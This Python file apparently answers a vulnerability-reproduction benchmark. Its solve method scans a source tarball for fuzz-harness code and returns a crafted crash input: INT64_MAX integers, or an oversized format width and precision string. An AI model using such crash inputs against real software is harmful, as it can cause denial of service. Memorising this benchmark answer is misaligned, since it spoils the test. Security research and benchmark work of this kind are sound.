import os
import re
import tarfile
import struct
from typing import List, Tuple, Optional


INT64_MAX = 0x7FFFFFFFFFFFFFFF
INT64_MAX_STR = "9223372036854775807"


def _read_text_from_tar(src_path: str, max_file_size: int = 2_000_000) -> List[Tuple[str, str]]:
    files: List[Tuple[str, str]] = []
    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > max_file_size:
                    continue
                name = m.name
                base = os.path.basename(name)
                if not re.search(r"\.(c|cc|cpp|cxx|h|hpp|hh|hxx|in|inc|ipp|m4|y|l|py|sh|txt|md)$", base, re.IGNORECASE):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                try:
                    txt = data.decode("utf-8", "ignore")
                except Exception:
                    try:
                        txt = data.decode("latin-1", "ignore")
                    except Exception:
                        continue
                files.append((name, txt))
    except Exception:
        return []
    return files


def _likely_harness_files(files: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
    harness = []
    for name, txt in files:
        base = os.path.basename(name).lower()
        if (
            "llvmfuzzertestoneinput" in txt
            or "afl" in base
            or "fuzz" in base
            or "harness" in base
            or "driver" in base
            or "poc" in base
            or "test" in base
        ):
            harness.append((name, txt))
    return harness if harness else files


def _extract_sscanf_formats(text: str) -> List[str]:
    fmts = []
    for m in re.finditer(r"\b(?:s?scanf|fscanf)\s*\(\s*[^;]*?\"((?:\\.|[^\"\\])*)\"", text, re.DOTALL):
        fmts.append(m.group(1))
    return fmts


def _count_integer_conversions(fmt: str) -> Tuple[int, List[Tuple[int, int]]]:
    convs: List[Tuple[int, int]] = []
    i = 0
    n = len(fmt)
    while i < n:
        if fmt[i] != "%":
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == "%":
            i += 2
            continue
        start = i
        i += 1
        if i < n and fmt[i] == "*":
            i += 1
        while i < n and fmt[i].isdigit():
            i += 1
        if i < n and fmt[i] == ".":
            i += 1
            if i < n and fmt[i] == "*":
                i += 1
            while i < n and fmt[i].isdigit():
                i += 1
        if i + 2 <= n and fmt[i:i+2] in ("hh", "ll"):
            i += 2
        elif i + 3 <= n and fmt[i:i+3] in ("I64", "I32"):
            i += 3
        elif i < n and fmt[i] in ("h", "l", "j", "z", "t", "L"):
            i += 1
        if i >= n:
            break
        spec = fmt[i]
        i += 1
        if spec in "diouxX":
            convs.append((start, i))
    return len(convs), convs


def _classify_two_int_separator(fmt: str) -> Optional[str]:
    cnt, convs = _count_integer_conversions(fmt)
    if cnt < 2:
        return None
    first_end = convs[0][1]
    second_start = convs[1][0]
    between = fmt[first_end:second_start]
    if "." in between:
        return "dot"
    return "space"


def _infer_text_input_style(harness_files: List[Tuple[str, str]]) -> Optional[str]:
    for _, txt in harness_files:
        if "sscanf" not in txt and "scanf" not in txt and "fscanf" not in txt:
            continue
        fmts = _extract_sscanf_formats(txt)
        for fmt in fmts:
            style = _classify_two_int_separator(fmt)
            if style is not None:
                return style
    return None


def _infer_binary_required_size(harness_files: List[Tuple[str, str]]) -> Optional[int]:
    combined = "\n".join(t for _, t in harness_files)
    if not (
        re.search(r"\bmemcpy\s*\(", combined)
        or re.search(r"\b(?:u?int64_t|long long|int64)\b", combined)
        or re.search(r"\*\s*\(\s*(?:u?int64_t|long long)\s*\*\s*\)\s*data", combined)
    ):
        return None

    if "sscanf" in combined or "scanf" in combined or "fscanf" in combined:
        return None

    req = 0
    for m in re.finditer(r"\bsize\b\s*<\s*(\d+)", combined):
        try:
            v = int(m.group(1))
            if 0 < v <= 4096:
                req = max(req, v)
        except Exception:
            pass
    return req if req > 0 else 16


class Solution:
    def solve(self, src_path: str) -> bytes:
        files = _read_text_from_tar(src_path)
        harness_files = _likely_harness_files(files)

        text_style = _infer_text_input_style(harness_files)
        if text_style == "dot":
            return (INT64_MAX_STR + "." + INT64_MAX_STR + "\n").encode("ascii")
        if text_style == "space":
            return (INT64_MAX_STR + " " + INT64_MAX_STR + "\n").encode("ascii")

        bin_req = _infer_binary_required_size(harness_files)
        if bin_req is not None:
            payload = struct.pack("<qq", INT64_MAX, INT64_MAX)
            if len(payload) < bin_req:
                payload += b"\x00" * (bin_req - len(payload))
            return payload

        width = INT64_MAX_STR
        precision = "922337203685477580"
        return ("%" + width + "." + precision + "d").encode("ascii")